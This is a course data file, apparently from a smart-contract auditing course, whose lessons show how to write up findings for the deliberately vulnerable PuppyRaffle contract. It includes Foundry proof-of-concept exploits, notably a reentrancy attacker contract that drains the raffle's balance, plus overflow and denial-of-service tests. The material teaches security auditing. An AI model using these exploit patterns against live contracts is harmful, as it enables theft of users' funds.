              ```
          ````

          With `informational` findings, you may notice our write ups don't always strictly adhere to outlining things like impact. `Informational` findings are often very subjective in both their impact and their recommended fixes. What defines _clean code_, for example, may vary from developer to developer.

          With that said, this write up looks great. Lets move on to `weak randomness` next.
        description: 'Informational PuppyRaffle issue, improving code with CEI.'
      -
        id: c4b25549-967f-4ff6-81b5-314786b4f966
        type: new_lesson
        enabled: true
        title: 'Reporting: Weak Randomness'
        slug: reporting-weak-randomness
        duration: 6
        video_url: esHpEFhlZ8FNWEGUT501FCLzrmMV1P32mWTywbpo01rmM
        raw_markdown_url: /routes/security/4-puppy-raffle/57-reporting-weak-randomness/+page.md
        markdown_content: |-
          ---
          title: Reporting - Weak Randomness
          ---

          _Follow along with this video:_

          ---

          ### Weak Randomness

          Our next marked finding was also in `selectWinner` and is referencing weak randomness.

          ```js
          function selectWinner() external {
              uint256 winnerIndex =
                  uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                  ...
                  uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
          }
          ```

          Lets consider what the severity of this would be by assessing the Impact and Likelihood.

          - **Impact:** High - If someone is able to predict the outcome of a raffle and exploit this knowledge, this fundamentally breaks this protocol's functionality.
          - **Likelihood:** High - A user has a lot of incentive to assure they win, and assure their token is rare. It's very likely this would be exploited.

          Our assessment pretty clearly points to this finding being of `High Severity`. Fortunately in previous lessons we already wrote a Proof of Concept for this, so let's take our finding template and start filling it in.

          ```
          **Title:**
          ### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

          **Description:** Hashing `msg.sender`, `block,timestamp` and `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

          **Note:** This additionally means users could front-run this function and call `refund` if they see they are not the winner.
          ```

          We'll talk more about front-running and MEV concerns later in the course, but know this exposes a vulnerability of this type here too.

          What's the impact of this?

          ```
          **Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if a gas war to choose a winner results.
          ```

          For our Proof of Concept, lets begin by outlining the details of exploiting this vulnerability. This attack vector is well known, so I might be cheating a little bit by linking to a reference of this exploit - but I challenge you to write a test that proves this vulnerability!

          ```
          **Proof of Concept:**

          1. Validators can know the values of `block.timestamp` and `block.difficulty` ahead of time and usee that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
          2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
          3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

          Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.
          ```

          Anyone who knows me, or as seen any of my other content knows what my recommendation is going to be!

          ```
          **Recommended Mitigation:** Consider using a cryptographically provable random number generator such as [Chainlink VRF](https://docs.chain.link/vrf)
          ```

          That's one more down! Our next finding to write up is `Magic Numbers`!
        description: 'Auditing blockchain randomness, Patrick explains how weak randomness can be exploited and suggests using secure generators like Chainlink VRF.'
      -
        id: afad0ae1-70b3-498c-af87-b23de07534ff
        type: new_lesson
        enabled: true
        title: 'Reporting: Magic Numbers'
        slug: reporting-magic-numbers
        duration: 2
        video_url: YZJPFoPoAnSJ8WwzKvLlb7MQ027mPU8FAdDtYCDdtMFE
        raw_markdown_url: /routes/security/4-puppy-raffle/58-reporting-magic-numbers/+page.md
        markdown_content: |-
          ---
          title: Reporting - Magic Numbers
          ---

          _Follow along with this video:_

          ---

          ### Reporting Magic Numbers

          Next up, we see the `selectWinner` function come up again with our `@Audit` tag. This time, it's pointing to `magic numbers`. Definitely an `informational` we should write up.

          ```js
          uint256 prizePool = (totalAmountCollected * 80) / 100;
          uint256 fee = (totalAmountCollected * 20) / 100;
          ```

          We see the problem here. When reading through a code base, number literals can make things difficult to understand.

          Lets add this to our `findings.md` report.

          ````
          ### [I-5] Use of "magic" numbers is discouraged

          It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

          Examples:
              ```js
              uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
              uint256 public constant FEE_PERCENTAGE = 20;
              uint256 public constant POOL_PRECISION = 100;

              uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
              uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
              ```
          ````

          We could probably be a little more verbose, but for the purposes of an `informational` in a private audit setting, this is sufficient. Mark it as complete and let's move on.
        description: 'Focus on Magic Numbers & Named Constants. Patrick provides Solidity examples & tips.'
      -
        id: 1423bd4e-6f88-4869-8ddf-cc8d3f83720f
        type: new_lesson
        enabled: true
        title: 'Reporting: Integer Overflow'
        slug: reporting-integer-overflow
        duration: 8
        video_url: Qu2fgua01IMbwQiLGcy7OOnOj73bmdCw6SYlVG2NLkCE
        raw_markdown_url: /routes/security/4-puppy-raffle/59-reporting-integer-overflow/+page.md
        markdown_content: |-
          ---
          title: Reporting - Integer Overflow
          ---

          _Follow along with this video:_

          ---

          ### Integer Overflow and Unsafe Casting

          Lets start with the integer overflow we identified in the `selectWinner` function. We thoroughly went through this vulnerability in previous lessons!

          ```js
          totalFees = totalFees + uint64(fee);
          ```

          We should begin by determining severity.

          - **Impact:** High - Fees are at risk of being lost/stuck. This typically is going to result in a high impact.
          - **Likelihood:** High - It could be argued that this is a `medium`, but the risk increases with how successful the protocol becomes, and we want Puppy Raffle to be successful. High.

          With the above determined, let's start filling out our finding template. I know this seems repetitive, but this is what's going to make you _really good_ at writing these reports.

          ```
          ### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees
          ```

          For the description section, lets include some of the work we did in `chisel` to show this happening.

          ````
          ### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

          **Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows.

              ```js
              uint64 myVar = type(uint64).max
              // 18446744073709551615
              myVar = myVar + 1
              // myVar will be 0
              ```

          **Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract
          ````

          Now, we didn't write a Proof of Concept together for this, but I _have_ prepared one. This is another moment I'm going to challenge you to write one yourself before continuing. You need to practice these skills to improve them.

          Once you've made an attempt, compare what you've done with the PoC I've provided below to see how you did!

          <details>
          <summary>Integer Overflow PoC</summary>

          1. We conclude a raffle of 4 players
          2. We then have 89 players enter a new raffle, and conclude the raffle
          3. 3. `totalFees` will be:

          ```js
          totalFees = totalFees + uint64(fee);
          // substituted
          totalFees = 800000000000000000 + 17800000000000000000;
          // due to overflow, the following is now the case
          totalFees = 153255926290448384;
          ```

          4. You will not be able to withdraw due to the line in `PuppyRaffle::withdrawFees`:

          ```js
          require(address(this).balance ==
            uint256(totalFees), "PuppyRaffle: There are currently players active!");
          ```

          Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

          <details>
          <summary>Code</summary>

          ```js
          function testTotalFeesOverflow() public playersEntered {
              // We finish a raffle of 4 to collect some fees
              vm.warp(block.timestamp + duration + 1);
              vm.roll(block.number + 1);
              puppyRaffle.selectWinner();
              uint256 startingTotalFees = puppyRaffle.totalFees();
              // startingTotalFees = 800000000000000000

              // We then have 89 players enter a new raffle
              uint256 playersNum = 89;
              address[] memory players = new address[](playersNum);
              for (uint256 i = 0; i < playersNum; i++) {
                  players[i] = address(i);
              }
              puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
              // We end the raffle
              vm.warp(block.timestamp + duration + 1);
              vm.roll(block.number + 1);

              // And here is where the issue occurs
              // We will now have fewer fees even though we just finished a second raffle
              puppyRaffle.selectWinner();

              uint256 endingTotalFees = puppyRaffle.totalFees();
              console.log("ending total fees", endingTotalFees);
              assert(endingTotalFees < startingTotalFees);

              // We are also unable to withdraw any fees because of the require check
              vm.prank(puppyRaffle.feeAddress());
              vm.expectRevert("PuppyRaffle: There are currently players active!");
              puppyRaffle.withdrawFees();
          }
          ```

          </details>

          </details>

          ---

          I trust you attempted the PoC yourself - time to add our recommended mitigation

          ````
          **Recommended Mitigation:** There are a few recommended mitigations here.

          1. Use a newer version of Solidity that does not allow integer overflows by default.
              ```diff
              - pragma solidity ^0.7.6;
              + pragma solidity ^0.8.18;
              ```
          Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

          1. Use a `uint256` instead of a `uint64` for `totalFees`.
              ```diff
              - uint64 public totalFees = 0;
              + uint256 public totalFees = 0;
              ```
          2. Remove the balance check in `PuppyRaffle::withdrawFees`
              ```diff
              - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
              ```
          We additionally want to bring your attention to another attack vector as a result of this line in a future finding.
          ````

          There's another finding we identified which is going to have a write up that is very similar to this one - unsafe casting. I'm going to challenge you to write this one yourself (as its a little repetitive and uninteresting after what we just did), but it's good practice. Compare your write up versus mine below.

          <details>
          <summary>Unsafe Casting Write Up</summary>
              
              ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

              **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

              ```javascript
                  function selectWinner() external {
                      require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
                      require(players.length > 0, "PuppyRaffle: No players in raffle");

                      uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                      address winner = players[winnerIndex];
                      uint256 fee = totalFees / 10;
                      uint256 winnings = address(this).balance - fee;
              @>      totalFees = totalFees + uint64(fee);
                      players = new address[](0);
                      emit RaffleWinner(winner, winnings);
                  }
              ```

              The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

              **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

              **Proof of Concept:**

              1. A raffle proceeds with a little more than 18 ETH worth of fees collected
              2. The line that casts the `fee` as a `uint64` hits
              3. `totalFees` is incorrectly updated with a lower amount

              You can replicate this in foundry's chisel by running the following:

              ```javascript
              uint256 max = type(uint64).max
              uint256 fee = max + 1
              uint64(fee)
              // prints 0
              ```

              **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

              ```javascript
              // We do some storage packing to save gas
              ```
              But the potential gas saved isn't worth it if we have to recast and this bug exists.

              ```diff
              -   uint64 public totalFees = 0;
              +   uint256 public totalFees = 0;
              .
              .
              .
                  function selectWinner() external {
                      require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
                      require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
                      uint256 winnerIndex =
                          uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
                      address winner = players[winnerIndex];
                      uint256 totalAmountCollected = players.length * entranceFee;
                      uint256 prizePool = (totalAmountCollected * 80) / 100;
                      uint256 fee = (totalAmountCollected * 20) / 100;
              -       totalFees = totalFees + uint64(fee);
              +       totalFees = totalFees + fee;
              ```
        description: 'Patrick explains two security issues found in PuppyRaffle - integer overflow and unsafe cast. Offers detailed explanations & potential mitigations.'
      -
        id: de5044e6-06ff-4e3c-b117-292bf5babb9b
        type: new_lesson
        enabled: true
        title: 'Reporting: Smart Contract Wallet Reverts Winning'
        slug: reporting-smart-contract-wallet-reverts-winning
        duration: 5
        video_url: 5n01fhvcNxXLLAJx01g5tV82UoZjhxjG4Vrz7uv01dbFb00
        raw_markdown_url: /routes/security/4-puppy-raffle/60-reporting-smart-contract-wallet-reverts-winning/+page.md
        markdown_content: |-
          ---
          title: Reporting - Smart Contract Wallet Reverts Winning
          ---

          _Follow along with this video:_

          ---

          ### Smart Contract Wallet Reverts Winning

          Next vulnerability on our docket is going to be:

          ```js
          //@Audit: winner wouldn't get their money if their fallback was messed up!
          ```

          This is absolutely an issue, our write up for it may be a _little_ lazy, but I think it's an important concept to be aware of.

          To assess the severity, we again consider:

          - **Impact:** Medium - potentially wastes gas, disrupts the functionality of the protocol when selectWinner continually reverts
          - **Likelihood:** Low - the impact is only severe when there are a lot of users, so I think we can safely say low.

          Sorted, lets fill out our finding template.

          ```
          ### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

          **Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

          Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

          **Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

          Also, true winners would not be able to get paid out, and someone else would win their money!

          **Proof of Concept:**
          1. 10 smart contract wallets enter the lottery without a fallback or receive function.
          2. The lottery ends
          3. The `selectWinner` function wouldn't work, even though the lottery is over!

          **Recommended Mitigation:** There are a few options to mitigate this issue.

          1. Do not allow smart contract wallet entrants (not recommended)
          2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)
          ```

          To briefly touch on our recommendations here - The reason disallowing smart contract entrants would not be a preferred mitigation, is that this would restrict situations like multisignature wallets from participating. We'd much rather not lock people out entirely.

          For this reason the second recommendation is preferred. This established a really good design pattern known as `Pull over Push`, where ideally, the user is making a request for funds, instead of a protocol distributing them.

          We've only got a few findings left! Let's keep going!
        description: "Winning smart lottery without fallback causes restart issues & gas waste; Suggested mitigation: mapping addresses to payouts, 'claim prize' function."
      -
        id: 24ea49ec-c15f-46d4-8f90-6830938e381d
        type: new_lesson
        enabled: true
        title: 'Reporting: Mishandling Of ETH'
        slug: reporting-mishandling-of-eth
        duration: 2
        video_url: hkAJeXIrnASRt8ZuKsfvcrmcGLunb1QxxlgOgBMo500s
        raw_markdown_url: /routes/security/4-puppy-raffle/61-reporting-mishandling-of-eth/+page.md
        markdown_content: |-
          ---
          title: Reporting - Mishandling of Eth
          ---

          _Follow along with this video:_

          ---

          ### Mishandling of Eth and MEV

          Frankly, we're going to skip the write ups for these.

          MEV issues, as I've mentioned, we'll go over later in the course, so we'll skip this for now.

          As for Mishandling of Eth, we briefly touched on this earlier. The issue really boils down to this line:

          ```js
          require(address(this).balance ==
            uint256(totalFees), "PuppyRaffle: There are currently players active!");
          ```

          This requirement to withdraw leads to a number of potential pitfalls, including an inability to withdraw if the contract accounting becomes broken as well as opening the protocol up to griefing should a raffle always be open. Generally something we should inform the protocol of.
        description: 'Writing our report for ETH Mishandling in PuppyRaffle.'
      -
        id: 9fd225bc-0235-4198-9c75-dfa5996e307d
        type: new_lesson
        enabled: true
        title: 'Reporting: Missing Events And Remove Dead Code'
        slug: reporting-missing-events-and-remove-dead-code
        duration: 2
        video_url: Uq1cq402i1k3hsPgOVjGtVQAXZQcbw02ZLtb016vuBRf00U
        raw_markdown_url: /routes/security/4-puppy-raffle/62-reporting-missing-events-and-remove-dead-code/+page.md
        markdown_content: |-
          ---
          title: Reporting - Missing Events And Remove Dead Code
          ---

          _Follow along with this video:_

          ---

          ## Missing Events and Dead Code

          There are definitely events missing in Puppy Raffle, but we'll keep this write up quick.

          This will be an informational finding, as we discussed earlier. A write up for this is going to look something like so:

          ```
          ### [I-6] State Changes are Missing Events

          A lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.

          It is best practice to emit an event whenever an action results in a state change.

          Examples:
          - `PuppyRaffle::totalFees` within the `selectWinner` function
          - `PuppyRaffle::raffleStartTime` within the `selectWinner` function
          - `PuppyRaffle::totalFees` within the `withdrawFees` function
          ```

          Additionally, a quick write is likely all that's required for the next finding we identified, which was that `_getActivePlayerIndex` was `dead code` and never actually used. This could be `Gas` or `Informational`.

          ````
          ### [I-7] _isActivePlayer is never used and should be removed

          **Description:** The function PuppyRaffle::_isActivePlayer is never used and should be removed.

              ```diff
              -    function _isActivePlayer() internal view returns (bool) {
              -        for (uint256 i = 0; i < players.length; i++) {
              -            if (players[i] == msg.sender) {
              -                return true;
              -            }
              -        }
              -        return false;
              -    }
              ```
          ````
        description: 'A quick report for missing events and unused function in PuppyRaffle!'
      -
        id: 8c41603b-156e-45b6-b603-b16525403bdf
        type: new_lesson
        enabled: true
        title: 'Adding The Audit To Our Portfolio'
        slug: adding-the-audit-to-our-portfolio
        duration: 6
        video_url: D1M02NFuke02zmyAu8eAUiHWronJFzAvGsxumG4Mt2z6M
        raw_markdown_url: /routes/security/4-puppy-raffle/63-adding-the-audit-to-our-portfolio/+page.md
        markdown_content: |-
          ---
          title: Adding The Audit To Our Portfolio
          ---

          _Follow along with this video:_

          ---

          ### Adding to our Portfolio

          Ok, we've - for the most part - completed the write ups for the findings we identified in Puppy Raffle. The next step is generatin our PDF report and adding this to our security portfolio!

          First step, let's add what we need to our `audit-data` folder.

          Boilerplating things is something you should get used to. This involves reusing assets and templating processes so that it's quick to get started. Here, we can grab our logo from our previous `PasswordStore` repo, and our formatted report template can be copied from [**`audit-report-templating`**](https://github.com/Cyfrin/audit-report-templating) repo into a new file we name `report-formatted.md` within our `audit-data` folder.

          <img src="/security-section-4/63-pdf-report/pdf-report1.png" width="75%" height="auto">

          With this template in place, we can just begin filling it out. Start by adding your name and details to customize the report.

          > **Note:** Keep an eye out for `//comments` in the report template below. This is where I'll have explained what's been added to each section.

          View the report in the dropdown below, please know it's quiet long.

          <details>
          <summary>PDF Report Template</summary>

              ---
              title: Puppy Raffle Audit Report
              author: <YourName>
              date: January 12, 2024
              header-includes:
              - \usepackage{titling}
              - \usepackage{graphicx}
              ---

              \begin{titlepage}
                  \centering
                  \begin{figure}[h]
                      \centering
                      \includegraphics[width=0.5\textwidth]{logo.pdf}
                  \end{figure}
                  \vspace*{2cm}
                  {\Huge\bfseries Protocol Audit Report\par}
                  \vspace{1cm}
                  {\Large Version 1.0\par}
                  \vspace{2cm}
                  {\Large\itshape Cyfrin.io\par}
                  \vfill
                  {\large \today\par}
              \end{titlepage}

              \maketitle

              <!-- Your report starts here! -->

              Prepared by: <You!>
              Lead Auditors:
              - <YourName>

              # Table of Contents
              - [Table of Contents](#table-of-contents)
              - [Protocol Summary](#protocol-summary)
              - [Disclaimer](#disclaimer)
              - [Risk Classification](#risk-classification)
              - [Audit Details](#audit-details)
              - [Scope](#scope)
              - [Roles](#roles)
              - [Executive Summary](#executive-summary)
              - [Issues found](#issues-found)
              - [Findings](#findings)
              - [High](#high)
              - [Medium](#medium)
              - [Low](#low)
              - [Informational](#informational)
              - [Gas](#gas)

              # Protocol Summary

              // You might want to write your own personal summary here for practice! We're going to steal some details from the protocol README

              This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

              - Call the enterRaffle function with the following parameters:
                  - address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
              - Duplicate addresses are not allowed
              - Users are allowed to get a refund of their ticket & value if they call the refund function
              - Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
              - The owner of the protocol will set a feeAddress to take a cut of the value, and the rest of the funds will be sent to the winner of the puppy.


              # Disclaimer

              The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

              # Risk Classification

              |            |        | Impact |        |     |
              | ---------- | ------ | ------ | ------ | --- |
              |            |        | High   | Medium | Low |
              |            | High   | H      | H/M    | M   |
              | Likelihood | Medium | H/M    | M      | M/L |
              |            | Low    | M      | M/L    | L   |

              We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

              # Audit Details
              // Here we'll grab the commit hash
              Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5

              ## Scope
              // Scope can be grabbed from the README as well, remember to replace the ‚îî‚îÄ‚îÄ symbol!

              ./src/
              #-- PuppyRaffle.sol

              ## Roles
              // These details should be provided by the protocol, grab them from the README.

              - Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.
              - Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.

              # Executive Summary
              // You can add any notes you'd like to this section to summarize your experience during the security review.

              I loved auditing this code base. Patrick is a wizard at writing intentionally bad code!

              ## Issues found

              | Severity | Number of issues found |
              | -------- | ---------------------- |
              | High     | 3                      |
              | Medium   | 3                      |
              | Low      | 1                      |
              | Info     | 7                      |
              | Gas      | 2                      |
              | Total    | 16                     |

              # Findings
              // Here we should be able to double check the formatting on our findings.md file and paste all of our findings here.

              ## High

              ### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance

              **Description:** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.

              In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array.

              ```javascript
              function refund(uint256 playerIndex) public {
                  address playerAddress = players[playerIndex];
                  require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
                  require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

              @>  payable(msg.sender).sendValue(entranceFee);

              @>  players[playerIndex] = address(0);
                  emit RaffleRefunded(playerAddress);
              }
              ```

              A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained.

              **Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

              **Proof of Concept:**

              1. Users enters the raffle.
              2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
              3. Attacker enters the raffle
              4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

              **Proof of Code:**

              <details>
              <summary>Code</summary>
              Add the following code to the `PuppyRaffleTest.t.sol` file.

              ```javascript
              contract ReentrancyAttacker {
                  PuppyRaffle puppyRaffle;
                  uint256 entranceFee;
                  uint256 attackerIndex;

                  constructor(address _puppyRaffle) {
                      puppyRaffle = PuppyRaffle(_puppyRaffle);
                      entranceFee = puppyRaffle.entranceFee();
                  }

                  function attack() external payable {
                      address[] memory players = new address[](1);
                      players[0] = address(this);
                      puppyRaffle.enterRaffle{value: entranceFee}(players);
                      attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
                      puppyRaffle.refund(attackerIndex);
                  }

                  fallback() external payable {
                      if (address(puppyRaffle).balance >= entranceFee) {
                          puppyRaffle.refund(attackerIndex);
                      }
                  }
              }

              function testReentrance() public playersEntered {
                  ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
                  vm.deal(address(attacker), 1e18);
                  uint256 startingAttackerBalance = address(attacker).balance;
                  uint256 startingContractBalance = address(puppyRaffle).balance;

                  attacker.attack();

                  uint256 endingAttackerBalance = address(attacker).balance;
                  uint256 endingContractBalance = address(puppyRaffle).balance;
                  assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
                  assertEq(endingContractBalance, 0);
              }
              ```
              </details>

              **Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

              ```diff
                  function refund(uint256 playerIndex) public {
                      address playerAddress = players[playerIndex];
                      require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
                      require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
              +       players[playerIndex] = address(0);
              +       emit RaffleRefunded(playerAddress);
                      (bool success,) = msg.sender.call{value: entranceFee}("");
                      require(success, "PuppyRaffle: Failed to refund player");
              -        players[playerIndex] = address(0);
              -        emit RaffleRefunded(playerAddress);
                  }
              ```

              ### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

              **Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

              **Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.

              **Proof of Concept:**

              There are a few attack vectors here.

              1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
              2. Users can manipulate the `msg.sender` value to result in their index being the winner.

              Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

              **Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

              ### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

              **Description:** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows.

              ```javascript
              uint64 myVar = type(uint64).max;
              // myVar will be 18446744073709551615
              myVar = myVar + 1;
              // myVar will be 0
              ```

              **Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

              **Proof of Concept:**
              3. We first conclude a raffle of 4 players to collect some fees.
              4. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
              5. `totalFees` will be:
              ```javascript
              totalFees = totalFees + uint64(fee);
              // substituted
              totalFees = 800000000000000000 + 17800000000000000000;
              // due to overflow, the following is now the case
              totalFees = 153255926290448384;
              ```
              6. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:
              ```javascript
              require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
              ```

              Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

              <details>
              <summary>Proof Of Code</summary>
              Place this into the `PuppyRaffleTest.t.sol` file.

              ```javascript
              function testTotalFeesOverflow() public playersEntered {
                      // We finish a raffle of 4 to collect some fees
                      vm.warp(block.timestamp + duration + 1);
                      vm.roll(block.number + 1);
                      puppyRaffle.selectWinner();
                      uint256 startingTotalFees = puppyRaffle.totalFees();
                      // startingTotalFees = 800000000000000000

                      // We then have 89 players enter a new raffle
                      uint256 playersNum = 89;
                      address[] memory players = new address[](playersNum);
                      for (uint256 i = 0; i < playersNum; i++) {
                          players[i] = address(i);
                      }
                      puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
                      // We end the raffle
                      vm.warp(block.timestamp + duration + 1);
                      vm.roll(block.number + 1);

                      // And here is where the issue occurs
                      // We will now have fewer fees even though we just finished a second raffle
                      puppyRaffle.selectWinner();

                      uint256 endingTotalFees = puppyRaffle.totalFees();
                      console.log("ending total fees", endingTotalFees);
                      assert(endingTotalFees < startingTotalFees);

                      // We are also unable to withdraw any fees because of the require check
                      vm.prank(puppyRaffle.feeAddress());
                      vm.expectRevert("PuppyRaffle: There are currently players active!");
                      puppyRaffle.withdrawFees();
                  }
              ```
              </details>

              **Recommended Mitigation:** There are a few recommended mitigations here.

              7. Use a newer version of Solidity that does not allow integer overflows by default.

              ```diff
              - pragma solidity ^0.7.6;
              + pragma solidity ^0.8.18;
              ```

              Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

              1. Use a `uint256` instead of a `uint64` for `totalFees`.

              ```diff
              - uint64 public totalFees = 0;
              + uint256 public totalFees = 0;
              ```

              1. Remove the balance check in `PuppyRaffle::withdrawFees`

              ```diff
              - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
              ```

              We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

              ### [H-4] Malicious winner can forever halt the raffle
              <!-- TODO: This is not accurate, but there are some issues. This is likely a low. Users who don't have a fallback can't get their money and the TX will fail. -->

              **Description:** Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.

              ```javascript
              (bool success,) = winner.call{value: prizePool}("");
              require(success, "PuppyRaffle: Failed to send prize pool to winner");
              ```

              If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.

              There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.

              Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.

              **Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

              **Proof of Concept:**

              <details>
              <summary>Proof Of Code</summary>
              Place the following test into `PuppyRaffleTest.t.sol`.

              ```javascript
              function testSelectWinnerDoS() public {
                  vm.warp(block.timestamp + duration + 1);
                  vm.roll(block.number + 1);

                  address[] memory players = new address[](4);
                  players[0] = address(new AttackerContract());
                  players[1] = address(new AttackerContract());
                  players[2] = address(new AttackerContract());
                  players[3] = address(new AttackerContract());
                  puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

                  vm.expectRevert();
